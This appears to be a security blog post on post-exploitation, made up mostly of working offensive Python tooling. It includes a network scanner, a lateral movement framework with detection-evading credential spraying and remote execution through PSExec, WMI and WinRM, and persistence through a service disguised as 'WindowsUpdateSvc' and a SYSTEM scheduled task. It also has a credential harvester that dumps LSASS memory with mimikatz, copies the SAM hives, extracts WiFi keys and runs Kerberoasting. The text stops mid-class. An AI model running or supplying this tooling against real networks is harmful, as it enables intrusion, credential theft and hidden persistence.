---
title: "Network Security and Lateral Movement: Advanced Post-Exploitation Techniques"
slug: "network-security-lateral-movement-advanced-post-exploitation-techniques"
date: "2025-06-12"
author: "BugB Security Team"
authorTitle: "Security Researchers"
excerpt: "Comprehensive guide to network security assessment and lateral movement techniques, covering advanced network reconnaissance, privilege escalation, and persistence mechanisms across modern enterprise environments."
category: "network-security"
---

# Network Security and Lateral Movement: Advanced Post-Exploitation Techniques

Network security has evolved far beyond simple perimeter defense as modern enterprise environments embrace cloud-hybrid architectures, remote work, and zero-trust principles. Today's security assessments must account for complex network topologies, encrypted traffic, and sophisticated lateral movement techniques that can bypass traditional detection mechanisms.

This comprehensive analysis explores advanced network security assessment methodologies, demonstrating systematic approaches to network reconnaissance, exploitation, and lateral movement that mirror real-world attack scenarios.

## Modern Network Security Landscape

### Evolution of Network Architecture

Contemporary enterprise networks present significantly more complex attack surfaces than traditional perimeter-focused designs:

| Network Model | Traditional | Cloud-Hybrid | Zero-Trust |
|---------------|-------------|--------------|------------|
| **Perimeter Defense** | Firewall-centric | Multi-cloud gateways | Identity-based access |
| **Trust Model** | Castle-and-moat | Segmented trust zones | Never trust, always verify |
| **Authentication** | Network-based | Federated identity | Continuous verification |
| **Traffic Encryption** | VPN tunnels | TLS everywhere | End-to-end encryption |
| **Monitoring** | Network-based | Cloud-native logging | Behavioral analytics |
| **Attack Surface** | Well-defined | Distributed | Dynamic and contextual |

### Network Attack Kill Chain

```
┌─────────────────────────────────────────────────────────────┐
│                Network Attack Progression                   │
├─────────────────────────────────────────────────────────────┤
│ 1. Network Discovery    │ → Active/Passive reconnaissance   │
│                        │   Service enumeration              │
│                        │   Network topology mapping        │
├─────────────────────────────────────────────────────────────┤
│ 2. Initial Foothold    │ → Vulnerable service exploitation │
│                        │   Credential harvesting           │
│                        │   Social engineering              │
├─────────────────────────────────────────────────────────────┤
│ 3. Local Enumeration   │ → Host-based reconnaissance       │
│                        │   Privilege enumeration           │
│                        │   Network share discovery         │
├─────────────────────────────────────────────────────────────┤
│ 4. Credential Access   │ → Password dumping                │
│                        │   Kerberos attacks                │
│                        │   Token manipulation              │
├─────────────────────────────────────────────────────────────┤
│ 5. Lateral Movement    │ → Administrative access abuse     │
│                        │   Service exploitation            │
│                        │   Protocol abuse                  │
├─────────────────────────────────────────────────────────────┤
│ 6. Persistence         │ → Backdoor deployment             │
│                        │   Scheduled task creation         │
│                        │   Service manipulation            │
├─────────────────────────────────────────────────────────────┤
│ 7. Data Exfiltration   │ → Sensitive data identification   │
│                        │   Covert channel establishment    │
│                        │   Anti-forensics techniques       │
└─────────────────────────────────────────────────────────────┘
```

---

## Advanced Network Reconnaissance

### Comprehensive Network Discovery Framework

```python
#!/usr/bin/env python3
"""
Advanced Network Reconnaissance Framework
Comprehensive network discovery and enumeration
"""

import socket
import struct
import threading
import subprocess
import time
import json
import ipaddress
from concurrent.futures import ThreadPoolExecutor
import scapy.all as scapy
import nmap

class NetworkReconFramework:
    def __init__(self, target_network):
        self.target_network = target_network
        self.discovered_hosts = []
        self.open_ports = {}
        self.services = {}
        self.network_shares = {}
        self.domain_info = {}
        
    def comprehensive_discovery(self):
        """Execute comprehensive network discovery"""
        
        discovery_results = {
            "network_scan": self.network_sweep(),
            "port_discovery": self.comprehensive_port_scan(),
            "service_enumeration": self.enumerate_services(),
            "smb_enumeration": self.enumerate_smb_shares(),
            "domain_enumeration": self.enumerate_domain_info(),
            "snmp_enumeration": self.enumerate_snmp(),
            "ssl_analysis": self.analyze_ssl_services(),
            "vulnerability_scan": self.vulnerability_assessment()
        }
        
        return discovery_results
    
    def network_sweep(self):
        """Advanced network sweep using multiple techniques"""
        hosts = []
        
        # ARP sweep for local network
        if self._is_local_network():
            hosts.extend(self._arp_sweep())
        
        # ICMP sweep
        hosts.extend(self._icmp_sweep())
        
        # TCP SYN sweep on common ports
        hosts.extend(self._syn_sweep())
        
        # DNS reverse lookup sweep
        hosts.extend(self._dns_sweep())
        
        # Remove duplicates and sort
        unique_hosts = list(set(hosts))
        self.discovered_hosts = sorted(unique_hosts, key=ipaddress.IPv4Address)
        
        return {
            "total_hosts": len(unique_hosts),
            "hosts": unique_hosts,
            "sweep_techniques": ["ARP", "ICMP", "TCP SYN", "DNS"]
        }
    
    def _arp_sweep(self):
        """ARP-based host discovery"""
        hosts = []
        
        try:
            # Create ARP request
            arp_request = scapy.ARP(pdst=self.target_network)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # Send packet and receive response
            answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            for element in answered_list:
                host_info = {
                    "ip": element[1].psrc,
                    "mac": element[1].hwsrc,
                    "method": "ARP"
                }
                hosts.append(element[1].psrc)
                
        except Exception as e:
            print(f"ARP sweep failed: {e}")
        
        return hosts
    
    def _icmp_sweep(self):
        """ICMP-based host discovery"""
        hosts = []
        
        def ping_host(ip):
            try:
                # Create ICMP packet
                icmp_packet = scapy.IP(dst=str(ip)) / scapy.ICMP()
                response = scapy.sr1(icmp_packet, timeout=1, verbose=False)
                
                if response and response.haslayer(scapy.ICMP):
                    if response[scapy.ICMP].type == 0:  # Echo Reply
                        return str(ip)
            except:
                pass
            return None
        
        # Threaded ICMP sweep
        network = ipaddress.IPv4Network(self.target_network, strict=False)
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            results = executor.map(ping_host, network.hosts())
            hosts = [ip for ip in results if ip is not None]
        
        return hosts
    
    def _syn_sweep(self):
        """TCP SYN-based host discovery"""
        hosts = []
        common_ports = [22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900]
        
        def syn_scan_host(ip):
            try:
                for port in common_ports[:5]:  # Test first 5 ports for speed
                    syn_packet = scapy.IP(dst=str(ip)) / scapy.TCP(dport=port, flags="S")
                    response = scapy.sr1(syn_packet, timeout=0.5, verbose=False)
                    
                    if response and response.haslayer(scapy.TCP):
                        if response[scapy.TCP].flags == 18:  # SYN-ACK
                            return str(ip)
                        elif response[scapy.TCP].flags == 20:  # RST-ACK
                            return str(ip)
            except:
                pass
            return None
        
        network = ipaddress.IPv4Network(self.target_network, strict=False)
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = executor.map(syn_scan_host, network.hosts())
            hosts = [ip for ip in results if ip is not None]
        
        return hosts
    
    def _dns_sweep(self):
        """DNS reverse lookup sweep"""
        hosts = []
        
        def reverse_dns_lookup(ip):
            try:
                hostname = socket.gethostbyaddr(str(ip))
                return str(ip)
            except:
                return None
        
        network = ipaddress.IPv4Network(self.target_network, strict=False)
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            results = executor.map(reverse_dns_lookup, network.hosts())
            hosts = [ip for ip in results if ip is not None]
        
        return hosts
    
    def comprehensive_port_scan(self):
        """Comprehensive port scanning using multiple techniques"""
        port_results = {}
        
        for host in self.discovered_hosts:
            print(f"[*] Scanning {host}")
            
            # TCP SYN scan
            tcp_ports = self._tcp_syn_scan(host)
            
            # UDP scan on common ports
            udp_ports = self._udp_scan(host)
            
            # Service detection
            services = self._service_detection(host, tcp_ports + udp_ports)
            
            port_results[host] = {
                "tcp_ports": tcp_ports,
                "udp_ports": udp_ports,
                "services": services
            }
            
            self.open_ports[host] = tcp_ports + udp_ports
            self.services[host] = services
        
        return port_results
    
    def _tcp_syn_scan(self, host):
        """TCP SYN scan using Scapy"""
        open_ports = []
        
        # Extended port list
        ports = list(range(1, 1024)) + [1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443]
        
        def scan_port(port):
            try:
                syn_packet = scapy.IP(dst=host) / scapy.TCP(dport=port, flags="S")
                response = scapy.sr1(syn_packet, timeout=1, verbose=False)
                
                if response and response.haslayer(scapy.TCP):
                    if response[scapy.TCP].flags == 18:  # SYN-ACK
                        # Send RST to close connection
                        rst_packet = scapy.IP(dst=host) / scapy.TCP(dport=port, flags="R")
                        scapy.send(rst_packet, verbose=False)
                        return port
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            results = executor.map(scan_port, ports)
            open_ports = [port for port in results if port is not None]
        
        return sorted(open_ports)
    
    def _udp_scan(self, host):
        """UDP scan for common services"""
        open_ports = []
        common_udp_ports = [53, 67, 68, 69, 123, 135, 137, 138, 161, 162, 389, 514, 520]
        
        def scan_udp_port(port):
            try:
                # Create UDP packet
                udp_packet = scapy.IP(dst=host) / scapy.UDP(dport=port)
                response = scapy.sr1(udp_packet, timeout=2, verbose=False)
                
                # Check for response or lack of ICMP unreachable
                if response:
                    if not response.haslayer(scapy.ICMP):
                        return port
                    elif response[scapy.ICMP].type != 3:  # Not unreachable
                        return port
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            results = executor.map(scan_udp_port, common_udp_ports)
            open_ports = [port for port in results if port is not None]
        
        return sorted(open_ports)
    
    def _service_detection(self, host, ports):
        """Service detection and version enumeration"""
        services = {}
        
        for port in ports:
            try:
                # Banner grabbing
                banner = self._grab_banner(host, port)
                if banner:
                    services[port] = {
                        "banner": banner,
                        "service": self._identify_service(port, banner)
                    }
                else:
                    services[port] = {
                        "service": self._identify_service_by_port(port)
                    }
            except:
                continue
        
        return services
    
    def _grab_banner(self, host, port):
        """Grab service banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            
            # Send HTTP request for web services
            if port in [80, 443, 8080, 8443]:
                sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            return banner.strip()
        except:
            return None
    
    def enumerate_smb_shares(self):
        """Enumerate SMB shares using multiple techniques"""
        smb_results = {}
        
        for host in self.discovered_hosts:
            if 445 in self.open_ports.get(host, []) or 139 in self.open_ports.get(host, []):
                smb_info = self._enumerate_smb_host(host)
                if smb_info:
                    smb_results[host] = smb_info
        
        self.network_shares = smb_results
        return smb_results
    
    def _enumerate_smb_host(self, host):
        """Enumerate SMB information for a specific host"""
        smb_info = {}
        
        try:
            # Use smbclient to enumerate shares
            smbclient_cmd = ['smbclient', '-L', f'//{host}', '-N']
            result = subprocess.run(smbclient_cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                shares = []
                lines = result.stdout.split('\n')
                
                for line in lines:
                    if 'Disk' in line or 'IPC' in line or 'Printer' in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            share_name = parts[0].strip()
                            share_type = parts[1].strip()
                            shares.append({
                                "name": share_name,
                                "type": share_type,
                                "accessible": self._test_share_access(host, share_name)
                            })
                
                smb_info['shares'] = shares
            
            # Get NetBIOS information
            nmblookup_cmd = ['nmblookup', '-A', host]
            nmb_result = subprocess.run(nmblookup_cmd, capture_output=True, text=True, timeout=5)
            
            if nmb_result.returncode == 0:
                smb_info['netbios'] = nmb_result.stdout
            
        except Exception as e:
            print(f"SMB enumeration failed for {host}: {e}")
        
        return smb_info if smb_info else None
    
    def _test_share_access(self, host, share):
        """Test access to SMB share"""
        try:
            test_cmd = ['smbclient', f'//{host}/{share}', '-N', '-c', 'dir']
            result = subprocess.run(test_cmd, capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    def enumerate_domain_info(self):
        """Enumerate Active Directory domain information"""
        domain_info = {}
        
        # Look for domain controllers
        domain_controllers = []
        for host in self.discovered_hosts:
            if self._is_domain_controller(host):
                domain_controllers.append(host)
                domain_info[host] = self._enumerate_dc_info(host)
        
        # Enumerate domain trusts
        if domain_controllers:
            domain_info['trusts'] = self._enumerate_domain_trusts(domain_controllers[0])
        
        self.domain_info = domain_info
        return domain_info
    
    def _is_domain_controller(self, host):
        """Check if host is a domain controller"""
        dc_ports = [88, 389, 636, 3268, 3269]  # Kerberos, LDAP, Global Catalog
        
        host_ports = self.open_ports.get(host, [])
        return any(port in host_ports for port in dc_ports)
    
    def _enumerate_dc_info(self, dc_ip):
        """Enumerate domain controller information"""
        dc_info = {}
        
        try:
            # LDAP enumeration
            ldap_info = self._ldap_enumeration(dc_ip)
            if ldap_info:
                dc_info['ldap'] = ldap_info
            
            # Kerberos enumeration
            krb_info = self._kerberos_enumeration(dc_ip)
            if krb_info:
                dc_info['kerberos'] = krb_info
                
        except Exception as e:
            print(f"DC enumeration failed for {dc_ip}: {e}")
        
        return dc_info
    
    def _ldap_enumeration(self, dc_ip):
        """Basic LDAP enumeration"""
        try:
            # Use ldapsearch for basic enumeration
            ldap_cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}', '-b', '', '-s', 'base']
            result = subprocess.run(ldap_cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                return {"root_dse": result.stdout}
        except:
            pass
        
        return None
    
    def enumerate_snmp(self):
        """Enumerate SNMP information"""
        snmp_results = {}
        
        for host in self.discovered_hosts:
            if 161 in self.open_ports.get(host, []):
                snmp_info = self._enumerate_snmp_host(host)
                if snmp_info:
                    snmp_results[host] = snmp_info
        
        return snmp_results
    
    def _enumerate_snmp_host(self, host):
        """Enumerate SNMP information for a host"""
        snmp_info = {}
        
        # Common community strings
        communities = ['public', 'private', 'community', 'snmp']
        
        for community in communities:
            try:
                # Use snmpwalk to enumerate
                snmp_cmd = ['snmpwalk', '-v2c', '-c', community, host, '1.3.6.1.2.1.1']
                result = subprocess.run(snmp_cmd, capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0 and result.stdout:
                    snmp_info[community] = {
                        "system_info": result.stdout,
                        "accessible": True
                    }
                    break
                    
            except Exception as e:
                continue
        
        return snmp_info if snmp_info else None
    
    def _is_local_network(self):
        """Check if target network is local"""
        try:
            network = ipaddress.IPv4Network(self.target_network, strict=False)
            return network.is_private
        except:
            return False

def generate_lateral_movement_framework():
    """Generate comprehensive lateral movement framework"""
    
    lateral_movement_code = '''
#!/usr/bin/env python3
"""
Advanced Lateral Movement Framework
Post-exploitation movement and persistence
"""

import subprocess
import socket
import base64
import hashlib
import os
import time
import json
from enum import Enum

class MovementTechnique(Enum):
    PSEXEC = "psexec"
    WMIEXEC = "wmiexec" 
    SMBEXEC = "smbexec"
    WINRM = "winrm"
    RDP = "rdp"
    SSH = "ssh"
    DCOM = "dcom"

class LateralMovementFramework:
    def __init__(self):
        self.compromised_hosts = []
        self.credentials = []
        self.movement_paths = []
        self.persistence_mechanisms = []
    
    def add_compromised_host(self, ip, credentials, privileges):
        """Add newly compromised host to tracking"""
        host_info = {
            "ip": ip,
            "credentials": credentials,
            "privileges": privileges,
            "compromise_time": time.time(),
            "movement_potential": self.assess_movement_potential(ip)
        }
        
        self.compromised_hosts.append(host_info)
        return host_info
    
    def assess_movement_potential(self, target_ip):
        """Assess lateral movement potential from target"""
        potential = {
            "techniques": [],
            "targets": [],
            "risk_score": 0
        }
        
        # Check for common lateral movement services
        lateral_ports = {
            135: "RPC/WMI",
            139: "NetBIOS",
            445: "SMB",
            3389: "RDP", 
            5985: "WinRM HTTP",
            5986: "WinRM HTTPS",
            22: "SSH"
        }
        
        open_ports = self.scan_ports(target_ip, list(lateral_ports.keys()))
        
        for port in open_ports:
            if port in lateral_ports:
                potential["techniques"].append({
                    "port": port,
                    "service": lateral_ports[port],
                    "technique": self.port_to_technique(port)
                })
                potential["risk_score"] += 1
        
        return potential
    
    def execute_psexec(self, target_ip, username, password, command):
        """Execute PSExec lateral movement"""
        try:
            # Simplified PSExec implementation
            psexec_cmd = [
                'psexec.py',
                f'{username}:{password}@{target_ip}',
                command
            ]
            
            result = subprocess.run(psexec_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.log_successful_movement(target_ip, MovementTechnique.PSEXEC)
                return {
                    "success": True,
                    "output": result.stdout,
                    "technique": "PSExec"
                }
            else:
                return {
                    "success": False,
                    "error": result.stderr,
                    "technique": "PSExec"
                }
                
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def execute_wmiexec(self, target_ip, username, password, command):
        """Execute WMI-based lateral movement"""
        try:
            wmiexec_cmd = [
                'wmiexec.py',
                f'{username}:{password}@{target_ip}',
                command
            ]
            
            result = subprocess.run(wmiexec_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.log_successful_movement(target_ip, MovementTechnique.WMIEXEC)
                return {
                    "success": True,
                    "output": result.stdout,
                    "technique": "WMIExec"
                }
            else:
                return {
                    "success": False,
                    "error": result.stderr
                }
                
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def execute_winrm(self, target_ip, username, password, command):
        """Execute WinRM lateral movement"""
        try:
            # Use evil-winrm or similar tool
            winrm_cmd = [
                'evil-winrm',
                '-i', target_ip,
                '-u', username,
                '-p', password,
                '-e', command
            ]
            
            result = subprocess.run(winrm_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.log_successful_movement(target_ip, MovementTechnique.WINRM)
                return {
                    "success": True,
                    "output": result.stdout,
                    "technique": "WinRM"
                }
                
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def credential_spray_attack(self, targets, username_list, password_list):
        """Execute credential spraying across multiple targets"""
        results = []
        
        for target in targets:
            for username in username_list:
                for password in password_list:
                    # Test SMB authentication
                    auth_result = self.test_smb_auth(target, username, password)
                    
                    if auth_result["success"]:
                        results.append({
                            "target": target,
                            "username": username,
                            "password": password,
                            "service": "SMB",
                            "success": True
                        })
                        
                        # Add to credentials list
                        self.credentials.append({
                            "target": target,
                            "username": username,
                            "password": password,
                            "type": "plaintext"
                        })
                    
                    # Add delay to avoid detection
                    time.sleep(1)
        
        return results
    
    def test_smb_auth(self, target, username, password):
        """Test SMB authentication"""
        try:
            smbclient_cmd = [
                'smbclient',
                f'//{target}/C$',
                '-U', f'{username}%{password}',
                '-c', 'dir'
            ]
            
            result = subprocess.run(smbclient_cmd, capture_output=True, text=True, timeout=10)
            
            return {
                "success": result.returncode == 0,
                "output": result.stdout if result.returncode == 0 else result.stderr
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def establish_persistence(self, target_ip, technique="service"):
        """Establish persistence on compromised host"""
        persistence_methods = {
            "service": self.create_service_persistence,
            "scheduled_task": self.create_scheduled_task,
            "registry": self.create_registry_persistence,
            "wmi_event": self.create_wmi_persistence
        }
        
        if technique in persistence_methods:
            result = persistence_methods[technique](target_ip)
            
            if result["success"]:
                self.persistence_mechanisms.append({
                    "target": target_ip,
                    "technique": technique,
                    "timestamp": time.time(),
                    "details": result
                })
            
            return result
        
        return {"success": False, "error": "Unknown persistence technique"}
    
    def create_service_persistence(self, target_ip):
        """Create Windows service for persistence"""
        try:
            # Create malicious service
            service_cmd = '''
            sc create "WindowsUpdateSvc" binpath= "cmd.exe /c powershell.exe -enc <base64_payload>"
            sc config "WindowsUpdateSvc" start= auto
            sc start "WindowsUpdateSvc"
            '''
            
            # Execute via existing lateral movement
            result = self.execute_remote_command(target_ip, service_cmd)
            
            return {
                "success": result["success"],
                "method": "Windows Service",
                "service_name": "WindowsUpdateSvc"
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def create_scheduled_task(self, target_ip):
        """Create scheduled task for persistence"""
        try:
            # Create scheduled task
            task_cmd = '''
            schtasks /create /tn "SystemMaintenance" /tr "powershell.exe -enc <base64_payload>" /sc onstart /ru SYSTEM
            '''
            
            result = self.execute_remote_command(target_ip, task_cmd)
            
            return {
                "success": result["success"],
                "method": "Scheduled Task",
                "task_name": "SystemMaintenance"
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def execute_remote_command(self, target_ip, command):
        """Execute command on remote host using available method"""
        # Try different methods in order of preference
        methods = [
            ("PSExec", self.execute_psexec),
            ("WMIExec", self.execute_wmiexec),
            ("WinRM", self.execute_winrm)
        ]
        
        # Get credentials for target
        target_creds = self.get_credentials_for_target(target_ip)
        
        if not target_creds:
            return {"success": False, "error": "No credentials available"}
        
        for method_name, method_func in methods:
            try:
                result = method_func(
                    target_ip,
                    target_creds["username"],
                    target_creds["password"],
                    command
                )
                
                if result["success"]:
                    return result
                    
            except Exception as e:
                continue
        
        return {"success": False, "error": "All methods failed"}
    
    def get_credentials_for_target(self, target_ip):
        """Get valid credentials for target"""
        for cred in self.credentials:
            if cred["target"] == target_ip:
                return cred
        return None
    
    def scan_ports(self, target, ports):
        """Quick port scan"""
        open_ports = []
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
                    
            except:
                continue
        
        return open_ports
    
    def port_to_technique(self, port):
        """Map port to lateral movement technique"""
        port_mapping = {
            135: MovementTechnique.WMIEXEC,
            445: MovementTechnique.SMBEXEC,
            3389: MovementTechnique.RDP,
            5985: MovementTechnique.WINRM,
            5986: MovementTechnique.WINRM,
            22: MovementTechnique.SSH
        }
        
        return port_mapping.get(port, MovementTechnique.PSEXEC)
    
    def log_successful_movement(self, target_ip, technique):
        """Log successful lateral movement"""
        movement_log = {
            "target": target_ip,
            "technique": technique.value,
            "timestamp": time.time(),
            "source": "lateral_movement_framework"
        }
        
        self.movement_paths.append(movement_log)
        print(f"[+] Successful lateral movement to {target_ip} via {technique.value}")
    
    def generate_movement_report(self):
        """Generate comprehensive movement report"""
        report = {
            "summary": {
                "compromised_hosts": len(self.compromised_hosts),
                "valid_credentials": len(self.credentials),
                "movement_attempts": len(self.movement_paths),
                "persistence_mechanisms": len(self.persistence_mechanisms)
            },
            "compromised_hosts": self.compromised_hosts,
            "credentials": self.credentials,
            "movement_paths": self.movement_paths,
            "persistence": self.persistence_mechanisms,
            "recommendations": self.generate_recommendations()
        }
        
        return report
    
    def generate_recommendations(self):
        """Generate security recommendations"""
        recommendations = []
        
        if len(self.compromised_hosts) > 0:
            recommendations.append({
                "category": "Network Segmentation",
                "priority": "HIGH",
                "recommendation": "Implement network segmentation to limit lateral movement"
            })
        
        if len(self.credentials) > 0:
            recommendations.append({
                "category": "Credential Management",
                "priority": "CRITICAL", 
                "recommendation": "Implement proper credential rotation and privileged access management"
            })
        
        if len(self.persistence_mechanisms) > 0:
            recommendations.append({
                "category": "Monitoring",
                "priority": "HIGH",
                "recommendation": "Deploy advanced endpoint detection and response (EDR) solutions"
            })
        
        return recommendations

# Usage example
if __name__ == "__main__":
    # Initialize framework
    framework = LateralMovementFramework()
    
    # Add initial compromised host
    framework.add_compromised_host(
        "192.168.1.100",
        {"username": "admin", "password": "password123"},
        "administrator"
    )
    
    # Execute credential spraying
    targets = ["192.168.1.101", "192.168.1.102", "192.168.1.103"]
    usernames = ["admin", "administrator", "user"]
    passwords = ["password123", "admin", "123456"]
    
    spray_results = framework.credential_spray_attack(targets, usernames, passwords)
    
    # Attempt lateral movement
    for result in spray_results:
        if result["success"]:
            movement_result = framework.execute_psexec(
                result["target"],
                result["username"], 
                result["password"],
                "whoami"
            )
            
            if movement_result["success"]:
                # Establish persistence
                framework.establish_persistence(result["target"], "service")
    
    # Generate report
    report = framework.generate_movement_report()
    print(json.dumps(report, indent=2))
'''
    
    return lateral_movement_code
```

---

## Advanced Credential Access and Privilege Escalation

### Windows Credential Harvesting

```python
#!/usr/bin/env python3
"""
Advanced Credential Harvesting Framework
Windows credential extraction and manipulation
"""

import subprocess
import base64
import hashlib
import re
import os
from enum import Enum

class CredentialType(Enum):
    NTLM = "ntlm"
    KERBEROS = "kerberos"
    PLAINTEXT = "plaintext"
    CERTIFICATE = "certificate"
    TOKEN = "token"

class WindowsCredentialHarvester:
    def __init__(self):
        self.harvested_credentials = []
        self.privilege_level = self.check_privilege_level()
    
    def check_privilege_level(self):
        """Check current privilege level"""
        try:
            # Check if running as administrator
            result = subprocess.run(['whoami', '/priv'], capture_output=True, text=True)
            
            if 'SeDebugPrivilege' in result.stdout:
                return "SYSTEM/Admin"
            elif 'SeShutdownPrivilege' in result.stdout:
                return "Administrator"
            else:
                return "User"
        except:
            return "Unknown"
    
    def harvest_lsass_memory(self):
        """Extract credentials from LSASS memory"""
        if self.privilege_level not in ["SYSTEM/Admin", "Administrator"]:
            return {"error": "Insufficient privileges for LSASS access"}
        
        lsass_creds = []
        
        try:
            # Use mimikatz to extract credentials
            mimikatz_cmd = [
                'mimikatz.exe',
                'privilege::debug',
                'sekurlsa::logonpasswords',
                'exit'
            ]
            
            result = subprocess.run(mimikatz_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Parse mimikatz output
                lsass_creds = self.parse_mimikatz_output(result.stdout)
            
        except Exception as e:
            # Fallback to PowerShell method
            lsass_creds = self.powershell_credential_extraction()
        
        return {
            "technique": "LSASS Memory Extraction",
            "credentials": lsass_creds,
            "privilege_required": "Administrator"
        }
    
    def parse_mimikatz_output(self, output):
        """Parse mimikatz output for credentials"""
        credentials = []
        
        # Regular expressions for different credential types
        patterns = {
            "username": r"Username\s*:\s*(.+)",
            "domain": r"Domain\s*:\s*(.+)",
            "ntlm": r"NTLM\s*:\s*([a-fA-F0-9]{32})",
            "sha1": r"SHA1\s*:\s*([a-fA-F0-9]{40})",
            "plaintext": r"Password\s*:\s*(.+)"
        }
        
        current_cred = {}
        
        for line in output.split('\n'):
            for cred_type, pattern in patterns.items():
                match = re.search(pattern, line)
                if match:
                    current_cred[cred_type] = match.group(1).strip()
                    
                    # If we have enough info, save credential
                    if len(current_cred) >= 3:
                        credentials.append(current_cred.copy())
                        current_cred = {}
        
        return credentials
    
    def powershell_credential_extraction(self):
        """Extract credentials using PowerShell techniques"""
        credentials = []
        
        # PowerShell script for credential extraction
        ps_script = '''
        # Extract stored credentials
        cmdkey /list | ForEach-Object {
            if ($_ -match "Target: (.+)") {
                $target = $matches[1]
                Write-Output "Target: $target"
            }
        }
        
        # Extract WiFi passwords
        netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            $profile = ($_ -split ":")[1].Trim()
            $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
            if ($password) {
                Write-Output "WiFi: $profile - $($password -split ':')[1].Trim()"
            }
        }
        '''
        
        try:
            result = subprocess.run([
                'powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script
            ], capture_output=True, text=True)
            
            # Parse PowerShell output
            for line in result.stdout.split('\n'):
                if 'Target:' in line:
                    credentials.append({
                        "type": "stored_credential",
                        "target": line.split(':', 1)[1].strip()
                    })
                elif 'WiFi:' in line:
                    parts = line.split(' - ')
                    if len(parts) == 2:
                        credentials.append({
                            "type": "wifi_password",
                            "ssid": parts[0].split(':', 1)[1].strip(),
                            "password": parts[1].strip()
                        })
        
        except Exception as e:
            credentials.append({"error": str(e)})
        
        return credentials
    
    def extract_sam_database(self):
        """Extract SAM database hashes"""
        if self.privilege_level not in ["SYSTEM/Admin"]:
            return {"error": "SYSTEM privileges required for SAM access"}
        
        sam_hashes = []
        
        try:
            # Use reg save to extract SAM
            sam_commands = [
                'reg save HKLM\\SAM C:\\temp\\sam.hive',
                'reg save HKLM\\SECURITY C:\\temp\\security.hive', 
                'reg save HKLM\\SYSTEM C:\\temp\\system.hive'
            ]
            
            for cmd in sam_commands:
                subprocess.run(cmd.split(), capture_output=True)
            
            # Use impacket to extract hashes
            secretsdump_cmd = [
                'secretsdump.py',
                '-sam', 'C:\\temp\\sam.hive',
                '-security', 'C:\\temp\\security.hive',
                '-system', 'C:\\temp\\system.hive',
                'LOCAL'
            ]
            
            result = subprocess.run(secretsdump_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                sam_hashes = self.parse_secretsdump_output(result.stdout)
            
            # Cleanup
            cleanup_files = ['C:\\temp\\sam.hive', 'C:\\temp\\security.hive', 'C:\\temp\\system.hive']
            for file in cleanup_files:
                try:
                    os.remove(file)
                except:
                    pass
        
        except Exception as e:
            sam_hashes.append({"error": str(e)})
        
        return {
            "technique": "SAM Database Extraction",
            "hashes": sam_hashes,
            "privilege_required": "SYSTEM"
        }
    
    def parse_secretsdump_output(self, output):
        """Parse secretsdump output for password hashes"""
        hashes = []
        
        for line in output.split('\n'):
            if ':' in line and len(line.split(':')) >= 4:
                parts = line.split(':')
                if len(parts[2]) == 32 and len(parts[3]) == 32:  # LM:NTLM format
                    hashes.append({
                        "username": parts[0],
                        "uid": parts[1],
                        "lm_hash": parts[2],
                        "ntlm_hash": parts[3],
                        "type": CredentialType.NTLM.value
                    })
        
        return hashes
    
    def kerberoast_attack(self, domain_controller):
        """Execute Kerberoasting attack"""
        kerberos_tickets = []
        
        try:
            # Use Rubeus for Kerberoasting
            rubeus_cmd = [
                'Rubeus.exe',
                'kerberoast',
                '/outfile:tickets.txt',
                '/domain:' + domain_controller
            ]
            
            result = subprocess.run(rubeus_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Read ticket file
                try:
                    with open('tickets.txt', 'r') as f:
                        ticket_data = f.read()
                        kerberos_tickets = self.parse_kerberos_tickets(ticket_data)
                    os.remove('tickets.txt')
                except:
                    pass
        
        except Exception as e:
            kerberos_tickets.append({"error": str(e)})
        
        return {
            "technique": "Kerberoasting",
            "tickets": kerberos_tickets,
            "privilege_required": "Domain User"
        }
    
    def asreproast_attack(self, domain_controller):
        """Execute ASREPRoasting attack"""
        asrep_hashes = []
        
        try:
            # Use GetNPUsers.py for ASREPRoasting
            asrep_cmd = [
                'GetNPUsers.py',
                '-dc-ip', domain_controller,
                '-request',
                'DOMAIN/'
            ]
            
            result = subprocess.run(asrep_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                asrep_hashes = self.parse_asrep_output(result.stdout)
        
        except Exception as e:
            asrep_hashes.append({"error": str(e)})
        
        return {
            "technique": "ASREPRoasting",
            "hashes": asrep_hashes,
            "privilege_required": "Network Access"
        }
    
